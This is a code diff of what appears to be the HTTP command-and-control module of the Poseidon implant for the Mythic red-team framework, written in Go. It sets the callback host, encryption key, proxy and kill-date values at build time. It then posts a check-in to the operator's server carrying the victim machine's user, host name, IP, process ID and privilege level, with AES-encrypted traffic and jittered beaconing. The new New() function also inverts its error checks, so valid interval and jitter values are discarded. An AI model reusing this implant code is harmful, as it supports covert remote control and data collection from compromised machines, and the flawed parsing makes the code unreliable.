@@ -1,46 +1,72 @@
+// +build linux darwin
+// +build http
+
 package profiles
 
 import (
 	"bytes"
 	"crypto/rsa"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"path/filepath"
-    "math/rand"
-	//"log"
-	"crypto/tls"
 	"math"
+	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
+	"path/filepath"
 	"reflect"
+	"strconv"
 	"strings"
-	"sync"
 	"time"
 
-	"pkg/utils/crypto"
-	"pkg/utils/functions"
-	"pkg/utils/structs"
+	// Poseidon
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
-var Config = structs.Defaultconfig{
-	"encrypted_exchange_check",
-	"AESPSK",
-	"callback_host:callback_port/",
-	"post_uri",
-	"get_uri",
-	"query_path_name",
-	"proxy_host:proxy_port/",
-	"proxy_user",
-	"proxy_pass",
-	callback_interval,
-	callback_jitter,
-	nil,
-}
+// HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
+// All variables must be a string so they can be set with ldflags
 
-var mu sync.Mutex
+// callback_host is the callback host
+var callback_host string
+
+// callback_port is the callback port
+var callback_port string
+
+// killdate is the Killdate
+var killdate string
+
+// encrypted_exchange_check is Perform Key Exchange
+var encrypted_exchange_check string
+
+// callback_interval is the callback interval in seconds
+var callback_interval string
+
+// callback_jitter is Callback Jitter in percent
+var callback_jitter string
+
+// headers
+var headers string
+
+// AESPSK is the Crypto type
+var AESPSK string
+
+// get_uri is the GET request URI
+var get_uri string
+
+// post_uri is the POST request URI
+var post_uri string
+
+// query_path_name is the name of the query parameter
+var query_path_name string
+var proxy_host string
+var proxy_port string
+var proxy_user string
+var proxy_pass string
 
 type C2Default struct {
 	BaseURL        string
@@ -60,14 +86,61 @@ type C2Default struct {
 	RsaPrivateKey  *rsa.PrivateKey
 }
 
-func newProfile() Profile {
-	return &C2Default{}
+// New creates a new HTTP C2 profile from the package's global variables and returns it
+func New() Profile {
+	profile := C2Default{
+		BaseURL:       fmt.Sprintf("%s:%s/", callback_host, callback_port),
+		PostURI:       post_uri,
+		GetURI:        get_uri,
+		QueryPathName: query_path_name,
+		ProxyUser:     proxy_user,
+		ProxyPass:     proxy_pass,
+		ApfellID:      UUID,
+		UUID:          UUID,
+		Key:           AESPSK,
+	}
+
+	// Convert sleep from string to integer
+	i, err := strconv.Atoi(callback_interval)
+	if err != nil {
+		profile.Interval = i
+	} else {
+		profile.Interval = 10
+	}
+
+	// Convert jitter from string to integer
+	j, err := strconv.Atoi(callback_jitter)
+	if err != nil {
+		profile.Jitter = j
+	} else {
+		profile.Jitter = 23
+	}
+
+	// Add HTTP Headers
+	json.Unmarshal([]byte(headers), &profile.HeaderList)
+
+	// Add proxy info if set
+	if len(proxy_host) > 3 {
+		profile.ProxyURL = fmt.Sprintf("%s:%s/", proxy_host, proxy_port)
+
+		if len(proxy_user) > 0 && len(proxy_pass) > 0 {
+			profile.ProxyUser = proxy_user
+			profile.ProxyPass = proxy_pass
+		}
+	}
+
+	if encrypted_exchange_check == "T" {
+		profile.ExchangingKeys = true
+	}
+
+	return &profile
 }
+
 func (c C2Default) getSleepTime() int {
-    if c.Jitter > 0 {
-		jit := float64(rand.Int() % c.Jitter) / float64(100)
+	if c.Jitter > 0 {
+		jit := float64(rand.Int()%c.Jitter) / float64(100)
 		jitDiff := float64(c.Interval) * jit
-		if int(jit*100) % 2 == 0 {
+		if int(jit*100)%2 == 0 {
 			return c.Interval + int(jitDiff)
 		} else {
 			return c.Interval - int(jitDiff)
@@ -105,73 +178,32 @@ func (c C2Default) ProfileType() string {
 //CheckIn a new agent
 func (c *C2Default) CheckIn(ip string, pid int, user string, host string, operatingsystem string, arch string) interface{} {
 	var resp []byte
-	// Set the C2 Profile values
-	c.BaseURL = Config.BaseURL
-	c.Interval = Config.Sleep
-	c.Jitter = Config.Jitter
-	c.PostURI = Config.PostURI
-	c.GetURI = Config.GetURI
-	c.QueryPathName = Config.QueryPathName
-    var hl []structs.HeaderStruct
-    json.Unmarshal([]byte(headers), &hl)
-    Config.HeaderList = hl
-	// Add proxy info if set
-	//if len(Config.ProxyURL) > 0 && !strings.Contains(Config.ProxyURL, "proxy_host:proxy_port/") {
-	if len(Config.ProxyURL) > 3{
-		c.ProxyURL = Config.ProxyURL
-	} else {
-		c.ProxyURL = ""
+	checkin := structs.CheckInMessage{
+		Action:       "checkin",
+		IP:           ip,
+		OS:           operatingsystem,
+		User:         user,
+		Host:         host,
+		Pid:          pid,
+		UUID:         c.UUID,
+		Architecture: arch,
 	}
 
-	//if !strings.Contains(Config.ProxyUser, "proxy_user") && !strings.Contains(Config.ProxyPass, "proxy_pass") {
-	if len(Config.ProxyUser) > 0 && len(Config.ProxyPass) > 0{
-		if len(Config.ProxyUser) > 0 && len(Config.ProxyPass) > 0 {
-			c.ProxyUser = Config.ProxyUser
-			c.ProxyPass = Config.ProxyPass
-		}
-	} else {
-		c.ProxyUser = ""
-		c.ProxyPass = ""
-	}
-
-	if strings.Contains(Config.KEYX, "T") {
-		c.ExchangingKeys = true
-	} else {
-		c.ExchangingKeys = false
-	}
-
-	if len(Config.Key) > 0 {
-		c.Key = Config.Key
-	} else {
-		c.Key = ""
-	}
-    c.HeaderList = Config.HeaderList
-
-	c.UUID = UUID
-	c.ApfellID = c.UUID
-	checkin := structs.CheckInMessage{}
-	checkin.Action = "checkin"
-	checkin.User = user
-	checkin.Host = host
-	checkin.IP = ip
-	checkin.Pid = pid
-	checkin.UUID = c.UUID
-	checkin.OS = operatingsystem
-	checkin.Architecture = arch
 	if functions.IsElevated() {
 		checkin.IntegrityLevel = 3
 	} else {
 		checkin.IntegrityLevel = 2
 	}
 
-	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
-		_ = c.NegotiateKey()
+	// Start Encrypted Key Exchange (EKE)
+	if c.ExchangingKeys {
+		c.NegotiateKey()
 	}
 
 	raw, _ := json.Marshal(checkin)
 	resp = c.htmlPostData(c.PostURI, raw)
 
-	// save the apfell id
+	// save the Mythic id
 	response := structs.CheckInMessageResponse{}
 	err := json.Unmarshal(resp, &response)
 
@@ -317,12 +349,12 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	}
 	contentLength := len(sendData)
 	req.ContentLength = int64(contentLength)
-	for _,val := range c.HeaderList {
-	    if val.Key == "Host" {
-	        req.Host = val.Value
-	    }else{
-	        req.Header.Set(val.Key, val.Value)
-	    }
+	for _, val := range c.HeaderList {
+		if val.Key == "Host" {
+			req.Host = val.Value
+		} else {
+			req.Header.Set(val.Key, val.Value)
+		}
 
 	}
 	// loop here until we can get our data to go through properly
@@ -443,14 +475,14 @@ func (c *C2Default) htmlGetData(requestUrl string, obody []byte) []byte {
 			continue
 		}
 
-		for _,val := range c.HeaderList {
-            if val.Key == "Host" {
-                req.Host = val.Value
-            }else{
-                req.Header.Set(val.Key, val.Value)
-            }
+		for _, val := range c.HeaderList {
+			if val.Key == "Host" {
+				req.Host = val.Value
+			} else {
+				req.Header.Set(val.Key, val.Value)
+			}
 
-        }
+		}
 		resp, err := client.Do(req)
 
 		if err != nil {
@@ -748,4 +780,3 @@ func (c *C2Default) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
 }
-
